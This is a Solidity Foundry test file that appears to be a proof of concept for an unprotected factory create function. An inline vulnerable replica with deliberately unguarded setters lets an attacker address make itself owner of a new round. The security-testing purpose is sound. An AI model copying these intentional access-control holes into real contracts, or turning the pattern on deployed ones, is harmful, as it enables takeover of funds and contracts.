// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "forge-std/Test.sol";

// Minimal vulnerable replica (inline — do NOT import from ../src/)
contract RoundImplementation {
    address public ownedBy;
    bool public initialized;

    // simplified initialize: decode ownedBy from encodedParameters
    function initialize(bytes calldata encodedParameters, address /* alloSettings */) external {
        require(!initialized, "already");
        initialized = true;
        ownedBy = abi.decode(encodedParameters, (address));
    }
}

contract RoundFactory {
    // only the state + functions your exploit touches
    address public roundImplementation;
    address public alloSettings;

    event RoundCreated(address indexed roundAddress, address indexed ownedBy, address indexed roundImplementation);

    // public setters to prepare the PoC (original had onlyOwner, omitted here for brevity)
    function setRoundImplementation(address impl) external {
        roundImplementation = impl;
    }
    function setAlloSettings(address a) external {
        alloSettings = a;
    }

    // vulnerable: public and unprotected create allowing anyone to create/init a round
    function create(bytes calldata encodedParameters, address ownedBy_) external returns (address) {
        require(roundImplementation != address(0), "roundImplementation is 0x");
        require(alloSettings != address(0), "alloSettings is 0x");

        // instead of cloning byte-for-byte, deploy a new minimal implementation to simulate a clone
        RoundImplementation clone = new RoundImplementation();

        emit RoundCreated(address(clone), ownedBy_, roundImplementation);

        // attacker-controlled encodedParameters will be used in initialize
        clone.initialize(encodedParameters, alloSettings);

        return address(clone);
    }
}

contract RoundFactoryTest is Test {
    RoundFactory target;
    RoundImplementation impl;
    address attacker;

    function setUp() public {
        impl = new RoundImplementation();
        target = new RoundFactory();
        attacker = makeAddr("attacker");

        // owner would normally set these; here we just prepare the factory
        target.setRoundImplementation(address(impl));
        target.setAlloSettings(address(0x123));
    }

    function test_attacker_exploits_create() public {
        // attacker calls create and supplies encodedParameters that set ownedBy to attacker
        vm.prank(attacker);
        bytes memory encoded = abi.encode(attacker);
        address newRound = target.create(encoded, attacker);

        // assert the created round was initialized with attacker as ownedBy
        assertEq(RoundImplementation(newRound).ownedBy(), attacker);
    }
}

